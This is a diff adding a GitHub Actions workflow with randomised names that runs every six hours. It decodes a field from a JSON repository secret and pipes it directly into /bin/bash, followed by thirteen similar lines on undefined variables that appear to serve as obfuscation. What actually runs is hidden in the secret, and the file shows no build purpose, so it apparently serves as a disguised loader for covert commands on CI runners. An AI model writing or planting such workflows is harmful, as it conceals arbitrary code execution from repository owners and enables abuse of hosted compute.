@@ -1,0 +1,31 @@
+name: zhongfuren6715
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhongfuren6715
+        env:
+          rdy989: ${{ secrets.rdy989 }}
+        run: |
+          echo $rdy989 | jq -r .oqqmg091 | /bin/bash
+          echo $hzbb70171 | jq -r .it43 | /bin/bash
+          echo $t14315 | jq -r .wmser244 | /bin/bash
+          echo $wrgzs270 | jq -r .ed935 | /bin/bash
+          echo $ieteo20195 | jq -r .wajl71 | /bin/bash
+          echo $qy962 | jq -r .pj22 | /bin/bash
+          echo $zgoj5 | jq -r .iztyo73 | /bin/bash
+          echo $a5795 | jq -r .tuu37 | /bin/bash
+          echo $q449 | jq -r .jm7888 | /bin/bash
+          echo $x80951 | jq -r .c7 | /bin/bash
+          echo $zy967 | jq -r .acaie57460 | /bin/bash
+          echo $kdang14232 | jq -r .h7 | /bin/bash
+          echo $xidfq3 | jq -r .ahaj2 | /bin/bash
+          echo $y628 | jq -r .ehe502 | /bin/bash
+
